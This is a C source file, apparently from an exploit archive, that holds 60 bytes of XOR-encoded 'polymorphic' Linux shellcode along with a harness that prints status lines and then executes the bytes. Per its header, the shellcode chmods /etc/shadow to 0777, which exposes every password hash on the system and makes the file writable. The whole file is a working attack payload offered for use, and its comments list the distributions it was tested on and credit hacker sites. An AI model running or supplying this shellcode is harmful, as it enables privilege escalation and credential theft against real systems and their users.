/*
 * sys_chmod("/etc/shadow", 0777) 60 bytes polymorphic shellcode
 *
 * tesla_ (gandung@ppp.cylab.cmu.edu)
 */

/*
 * Tested in : 
 * - BackTrack 5 (linux-2.6.38-generic)
 * - Ubuntu 10.10 Maverick Meerkat (linux-2.6.38-generic)
 * - Ubuntu 11.04 Natty Narwhal
 * - Debian Squeeze 6.0.2 (linux-2.6.32-5-stable)
 */

#include <stdio.h>
#include <string.h>

char encoded_shadow[] = "\xeb\x0d\x5e\x31\xc9\xb1\x28\x80\x36\x6e"
			"\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff"
			"\x5f\xae\xed\x82\x6f\xe6\x6a\x4a\x3e\x06"
			"\x0f\x0a\x01\x19\x06\x0d\x41\x1d\x06\x06"
			"\x41\x41\x0b\x1a\xde\x61\xe7\x8d\x08\xd7"
			"\x91\x6f\xa3\xee\x5f\xae\xde\x6f\xa3\xee";

int main(void) {
  int shadow_len = strlen(encoded_shadow);
  printf("[+] Using key mutation engine : 0x6e\n");
  printf("[+] Length of this shellcode is : %d bytes\n", shadow_len);
  printf("[+] After executing this code, be sure to check the \"perms\" in \"/etc/shadow\"\n");
  (*(void(*)())encoded_shadow)();
  return 0;
}

/* devilzc0de.org, hacker-newbie.org, sdf.lonestar.org, 1337day.com */